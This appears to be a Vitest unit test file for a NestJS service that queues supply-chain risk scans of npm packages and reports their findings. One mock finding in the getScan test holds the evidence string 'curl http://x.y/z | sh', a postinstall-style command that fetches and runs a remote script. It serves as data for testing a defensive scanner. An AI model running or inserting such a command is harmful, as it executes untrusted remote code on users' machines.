import { HttpStatus, NotFoundException } from '@nestjs/common';
import type { Queue } from 'bullmq';
import dayjs from 'dayjs';
import type { PrismaService } from '../../infra/prisma/prisma.service.js';
import type { AuthUser } from '../auth/auth.types.js';
import type { RegistryService } from '../packages/registry/registry.service.js';
import { ScansService } from './scans.service.js';

const USER: AuthUser = { uid: 'k3F9x2Mq7A', userName: 'apu', role: 'USER' };
const CREATED_AT = dayjs('2026-10-28T10:00:00Z').toDate();

const REGISTRY_PACKAGE = {
  name: 'left-pad',
  distTags: { latest: '1.3.0' },
  versions: [
    {
      version: '1.2.0',
      publishedAt: '2017-01-01T00:00:00.000Z',
      tarballUrl: 'https://registry.npmjs.org/left-pad/-/left-pad-1.2.0.tgz',
      integrity: 'sha512-old',
    },
    {
      version: '1.3.0',
      publishedAt: '2018-04-01T00:00:00.000Z',
      tarballUrl: 'https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz',
      integrity: 'sha512-new',
    },
  ],
};

const SCAN = {
  uid: 'Ab3dE5gH7j',
  status: 'queued',
  packageName: 'left-pad',
  createdAt: CREATED_AT,
};

describe('ScansService', () => {
  let prisma: {
    user: { findUnique: ReturnType<typeof vi.fn> };
    package: { upsert: ReturnType<typeof vi.fn> };
    packageVersion: { upsert: ReturnType<typeof vi.fn> };
    finding: { deleteMany: ReturnType<typeof vi.fn> };
    scan: {
      findUnique: ReturnType<typeof vi.fn>;
      upsert: ReturnType<typeof vi.fn>;
    };
    manifest: {
      create: ReturnType<typeof vi.fn>;
      findUnique: ReturnType<typeof vi.fn>;
    };
    $transaction: ReturnType<typeof vi.fn>;
  };
  let registry: { getPackage: ReturnType<typeof vi.fn> };
  let scanQueue: {
    add: ReturnType<typeof vi.fn>;
    remove: ReturnType<typeof vi.fn>;
  };
  let scansService: ScansService;

  beforeEach(() => {
    prisma = {
      user: { findUnique: vi.fn() },
      package: { upsert: vi.fn().mockResolvedValue({ id: 5n }) },
      packageVersion: { upsert: vi.fn().mockResolvedValue({ id: 9n }) },
      finding: { deleteMany: vi.fn() },
      scan: { findUnique: vi.fn(), upsert: vi.fn() },
      manifest: {
        create: vi
          .fn()
          .mockResolvedValue({ uid: 'Bk3dE5gH7j', createdAt: CREATED_AT }),
        findUnique: vi.fn(),
      },
      // the batch transaction resolves to the result of each query
      $transaction: vi.fn((queries: unknown[]) => Promise.all(queries)),
    };
    prisma.scan.upsert.mockResolvedValue(SCAN);
    registry = { getPackage: vi.fn().mockResolvedValue(REGISTRY_PACKAGE) };
    scanQueue = { add: vi.fn(), remove: vi.fn() };
    scansService = new ScansService(
      prisma as unknown as PrismaService,
      registry as unknown as RegistryService,
      scanQueue as unknown as Queue,
    );
  });

  describe('createScan', () => {
    it('scans the latest version when none was requested', async () => {
      const result = await scansService.createScan({ packageName: 'left-pad' });

      expect(prisma.packageVersion.upsert.mock.calls[0][0].create).toEqual({
        packageId: 5n,
        version: '1.3.0',
        publishedAt: dayjs('2018-04-01T00:00:00.000Z').toDate(),
        tarballUrl: 'https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz',
        integrity: 'sha512-new',
      });
      expect(result.status).toBe(HttpStatus.ACCEPTED);
      expect(result.data).toEqual({ ...SCAN, version: '1.3.0' });
    });

    it('scans the requested version', async () => {
      const result = await scansService.createScan({
        packageName: 'left-pad',
        version: '1.2.0',
      });

      expect(prisma.packageVersion.upsert.mock.calls[0][0].create.version).toBe(
        '1.2.0',
      );
      expect(result.data).toMatchObject({ version: '1.2.0' });
    });

    it('creates the scan for the version without a user', async () => {
      await scansService.createScan({ packageName: 'left-pad' });

      expect(prisma.user.findUnique).not.toHaveBeenCalled();
      expect(prisma.scan.upsert.mock.calls[0][0]).toMatchObject({
        where: { packageVersionId: 9n },
        create: {
          packageName: 'left-pad',
          packageVersionId: 9n,
          userId: undefined,
        },
      });
    });

    it('links the scan to the logged-in user', async () => {
      prisma.user.findUnique.mockResolvedValue({ id: 7n });

      await scansService.createScan({ packageName: 'left-pad' }, USER);

      expect(prisma.user.findUnique.mock.calls[0][0].where).toEqual({
        uid: USER.uid,
      });
      const upsert = prisma.scan.upsert.mock.calls[0][0];
      expect(upsert.create.userId).toBe(7n);
      expect(upsert.update.userId).toBe(7n);
    });

    it('clears the old result and findings of a finished scan', async () => {
      prisma.scan.findUnique.mockResolvedValue({
        ...SCAN,
        status: 'completed',
      });

      await scansService.createScan({ packageName: 'left-pad' });

      expect(prisma.finding.deleteMany.mock.calls[0][0].where).toEqual({
        scanInfo: { packageVersionId: 9n },
      });
      expect(prisma.scan.upsert.mock.calls[0][0].update).toMatchObject({
        status: 'queued',
        riskScore: null,
        riskLevel: null,
        error: null,
        analyzerVersion: null,
        startedAt: null,
        completedAt: null,
      });
      expect(prisma.$transaction).toHaveBeenCalledTimes(1);
    });

    it('keeps the old user on an anonymous rescan', async () => {
      await scansService.createScan({ packageName: 'left-pad' });

      expect(prisma.scan.upsert.mock.calls[0][0].update).not.toHaveProperty(
        'userId',
      );
    });

    it('removes the last job, then queues the scan', async () => {
      await scansService.createScan({ packageName: 'left-pad' });

      expect(scanQueue.remove).toHaveBeenCalledWith('Ab3dE5gH7j');
      expect(scanQueue.add).toHaveBeenCalledWith(
        'scan',
        { scanUid: 'Ab3dE5gH7j' },
        {
          jobId: 'Ab3dE5gH7j',
          attempts: 3,
          backoff: { type: 'exponential', delay: 5000 },
        },
      );
      expect(scanQueue.remove.mock.invocationCallOrder[0]).toBeLessThan(
        scanQueue.add.mock.invocationCallOrder[0],
      );
    });

    it.each(['queued', 'running'])(
      'returns a %s scan as it is, without a second job',
      async (status) => {
        prisma.scan.findUnique.mockResolvedValue({ ...SCAN, status });

        const result = await scansService.createScan({
          packageName: 'left-pad',
        });

        expect(result).toMatchObject({
          status: HttpStatus.ACCEPTED,
          message: 'Scan is already in progress',
          data: { uid: 'Ab3dE5gH7j', status, version: '1.3.0' },
        });
        expect(prisma.scan.upsert).not.toHaveBeenCalled();
        expect(scanQueue.add).not.toHaveBeenCalled();
      },
    );

    it('throws NotFoundException when the version does not exist', async () => {
      await expect(
        scansService.createScan({ packageName: 'left-pad', version: '9.9.9' }),
      ).rejects.toThrow(NotFoundException);

      expect(prisma.package.upsert).not.toHaveBeenCalled();
      expect(scanQueue.add).not.toHaveBeenCalled();
    });

    it('passes on the 404 when the package does not exist', async () => {
      const error = new NotFoundException('Package "nope" was not found');
      registry.getPackage.mockRejectedValue(error);

      await expect(
        scansService.createScan({ packageName: 'nope' }),
      ).rejects.toBe(error);

      expect(prisma.package.upsert).not.toHaveBeenCalled();
    });
  });

  describe('createBulkScan', () => {
    const bulkScan = (dependencies: object, includeDev?: boolean) =>
      scansService.createBulkScan({
        packageJson: JSON.stringify(dependencies),
        includeDev,
      });

    const savedManifest = () => prisma.manifest.create.mock.calls[0][0].data;

    it.each([
      ['not JSON', '{dependencies', 'package.json is not valid JSON'],
      ['an array', '[]', 'package.json must be a JSON object'],
      ['empty', '{"name":"app"}', 'package.json has no dependencies'],
    ])('rejects a package.json that is %s', async (_, packageJson, message) => {
      await expect(
        scansService.createBulkScan({ packageJson }),
      ).rejects.toMatchObject({ status: HttpStatus.BAD_REQUEST, message });
    });

    it('reads devDependencies only when asked', async () => {
      const packageJson = {
        dependencies: { 'left-pad': '^1.0.0' },
        devDependencies: { 'left-pad': '1.2.0', vitest: '^4.0.0' },
      };

      await bulkScan(packageJson);
      expect(registry.getPackage).toHaveBeenCalledTimes(1);

      registry.getPackage.mockClear();
      await bulkScan(packageJson, true);
      // left-pad is read once, from dependencies
      expect(registry.getPackage.mock.calls).toEqual([
        ['left-pad'],
        ['vitest'],
      ]);
    });

    it('skips dependencies that are not on the registry', async () => {
      await bulkScan({
        dependencies: {
          a: 'git+https://github.com/x/a.git',
          b: 'https://example.com/b.tgz',
          c: 'file:../c',
          d: 'workspace:*',
          e: 'user/repo#main',
          f: 'link:./f',
        },
      });

      expect(registry.getPackage).not.toHaveBeenCalled();
      expect(savedManifest().skipped).toEqual([
        {
          packageName: 'a',
          range: 'git+https://github.com/x/a.git',
          reason: 'Git dependencies are not scanned',
        },
        {
          packageName: 'b',
          range: 'https://example.com/b.tgz',
          reason: 'URL dependencies are not scanned',
        },
        {
          packageName: 'c',
          range: 'file:../c',
          reason: 'Local dependencies are not scanned',
        },
        {
          packageName: 'd',
          range: 'workspace:*',
          reason: 'Workspace packages are not scanned',
        },
        {
          packageName: 'e',
          range: 'user/repo#main',
          reason: 'Git dependencies are not scanned',
        },
        {
          packageName: 'f',
          range: 'link:./f',
          reason: 'Local dependencies are not scanned',
        },
      ]);
      expect(savedManifest().manifestDependencies.create).toEqual([]);
    });

    it.each([
      ['^1.0.0', '1.3.0'],
      ['~1.2.0', '1.2.0'],
      ['latest', '1.3.0'],
      ['*', '1.3.0'],
      ['1.2.0', '1.2.0'],
    ])('resolves the range %s to %s', async (range, version) => {
      await bulkScan({ dependencies: { 'left-pad': range } });

      expect(prisma.packageVersion.upsert.mock.calls[0][0].create.version).toBe(
        version,
      );
      expect(savedManifest().manifestDependencies.create).toEqual([
        {
          packageName: 'left-pad',
          range,
          scanInfo: { connect: { packageVersionId: 9n } },
        },
      ]);
    });

    it('prefers the latest dist-tag over a higher version in range', async () => {
      registry.getPackage.mockResolvedValue({
        ...REGISTRY_PACKAGE,
        distTags: { latest: '1.2.0' },
      });

      await bulkScan({ dependencies: { 'left-pad': '^1.0.0' } });

      expect(prisma.packageVersion.upsert.mock.calls[0][0].create.version).toBe(
        '1.2.0',
      );
    });

    it('scans the real package of an npm: alias', async () => {
      await bulkScan({ dependencies: { pad: 'npm:left-pad@^1.2.0' } });

      expect(registry.getPackage).toHaveBeenCalledWith('left-pad');
      expect(savedManifest().manifestDependencies.create[0]).toMatchObject({
        packageName: 'pad',
        range: 'npm:left-pad@^1.2.0',
      });
    });

    it('skips a missing package, an unreachable registry and an unmatched range', async () => {
      registry.getPackage.mockImplementation((name: string) => {
        if (name === 'nope') {
          return Promise.reject(new NotFoundException('not found'));
        }
        if (name === 'down') return Promise.reject(new Error('timeout'));
        return Promise.resolve(REGISTRY_PACKAGE);
      });

      await bulkScan({
        dependencies: { nope: '^1.0.0', down: '^1.0.0', 'left-pad': '^9.0.0' },
      });

      expect(savedManifest().skipped).toEqual([
        {
          packageName: 'nope',
          range: '^1.0.0',
          reason: 'Package was not found on npm',
        },
        {
          packageName: 'down',
          range: '^1.0.0',
          reason: 'npm registry could not be reached',
        },
        {
          packageName: 'left-pad',
          range: '^9.0.0',
          reason: 'No version matches "^9.0.0"',
        },
      ]);
      expect(prisma.package.upsert).not.toHaveBeenCalled();
    });

    it('queues a new version', async () => {
      prisma.scan.findUnique.mockResolvedValue(null);

      await bulkScan({ dependencies: { 'left-pad': '^1.0.0' } });

      expect(prisma.scan.upsert).toHaveBeenCalledTimes(1);
      expect(scanQueue.add).toHaveBeenCalledTimes(1);
    });

    it.each(['completed', 'queued', 'running'])(
      'reuses a %s scan without queueing it again',
      async (status) => {
        prisma.scan.findUnique.mockResolvedValue({ status });

        await bulkScan({ dependencies: { 'left-pad': '^1.0.0' } });

        expect(prisma.scan.upsert).not.toHaveBeenCalled();
        expect(scanQueue.add).not.toHaveBeenCalled();
        expect(savedManifest().manifestDependencies.create).toHaveLength(1);
      },
    );

    it('scans a failed version again', async () => {
      prisma.scan.findUnique.mockResolvedValue({ status: 'failed' });

      await bulkScan({ dependencies: { 'left-pad': '^1.0.0' } });

      expect(prisma.scan.upsert.mock.calls[0][0].update.status).toBe('queued');
      expect(scanQueue.add).toHaveBeenCalledTimes(1);
    });

    it('links the bulk scan to the logged-in user', async () => {
      prisma.user.findUnique.mockResolvedValue({ id: 7n });

      await scansService.createBulkScan(
        { packageJson: '{"dependencies":{"left-pad":"^1.0.0"}}' },
        USER,
      );

      expect(savedManifest().userId).toBe(7n);
    });

    it('returns the bulk scan uid and counts', async () => {
      const result = await bulkScan({
        dependencies: { 'left-pad': '^1.0.0', local: 'file:../local' },
      });

      expect(result).toEqual({
        status: HttpStatus.ACCEPTED,
        message: 'Bulk scan queued successfully',
        data: {
          uid: 'Bk3dE5gH7j',
          createdAt: CREATED_AT,
          total: 1,
          skipped: 1,
        },
      });
    });
  });

  describe('getBulkScan', () => {
    const item = (packageName: string, status: string, riskLevel?: string) => ({
      packageName,
      range: '^1.0.0',
      scanInfo: {
        uid: `${packageName}-uid`,
        status,
        riskScore: riskLevel ? 50 : null,
        riskLevel: riskLevel ?? null,
        packageVersionInfo: { version: '1.0.0' },
      },
    });

    it('returns progress, risk counts and each package', async () => {
      const skipped = [
        {
          packageName: 'local',
          range: 'file:../local',
          reason: 'Local dependencies are not scanned',
        },
      ];
      prisma.manifest.findUnique.mockResolvedValue({
        uid: 'Bk3dE5gH7j',
        includeDev: false,
        skipped,
        createdAt: CREATED_AT,
        manifestDependencies: [
          item('a', 'completed', 'high'),
          item('b', 'completed', 'low'),
          item('c', 'failed'),
          item('d', 'running'),
        ],
      });

      const result = await scansService.getBulkScan('Bk3dE5gH7j');

      expect(result.data).toMatchObject({
        uid: 'Bk3dE5gH7j',
        progress: { done: 3, total: 4 },
        counts: { low: 1, medium: 0, high: 1 },
        skipped,
      });
      expect(result.data.items[0]).toEqual({
        packageName: 'a',
        range: '^1.0.0',
        scanUid: 'a-uid',
        version: '1.0.0',
        status: 'completed',
        riskScore: 50,
        riskLevel: 'high',
      });
    });

    it('throws NotFoundException when the bulk scan does not exist', async () => {
      prisma.manifest.findUnique.mockResolvedValue(null);

      await expect(scansService.getBulkScan('missing')).rejects.toThrow(
        NotFoundException,
      );
    });
  });

  describe('getScan', () => {
    it('returns the report of a completed scan', async () => {
      prisma.scan.findUnique.mockResolvedValue({
        uid: 'Ab3dE5gH7j',
        status: 'completed',
        packageName: 'left-pad',
        riskScore: 82,
        riskLevel: 'high',
        error: null,
        createdAt: CREATED_AT,
        startedAt: CREATED_AT,
        completedAt: CREATED_AT,
        packageVersionInfo: { version: '1.3.0' },
        findings: [
          {
            checkType: 'install_scripts',
            severity: 'high',
            summary: 'postinstall runs a remote shell script',
            evidence: 'curl http://x.y/z | sh',
          },
        ],
      });

      const result = await scansService.getScan('Ab3dE5gH7j');

      expect(result.status).toBe(HttpStatus.OK);
      expect(result.data).toMatchObject({
        uid: 'Ab3dE5gH7j',
        status: 'completed',
        version: '1.3.0',
        riskScore: 82,
        riskLevel: 'high',
        error: null,
      });
      expect(result.data.findings).toHaveLength(1);
    });

    it('throws NotFoundException when the scan does not exist', async () => {
      prisma.scan.findUnique.mockResolvedValue(null);

      await expect(scansService.getScan('missing')).rejects.toThrow(
        NotFoundException,
      );
    });
  });
});
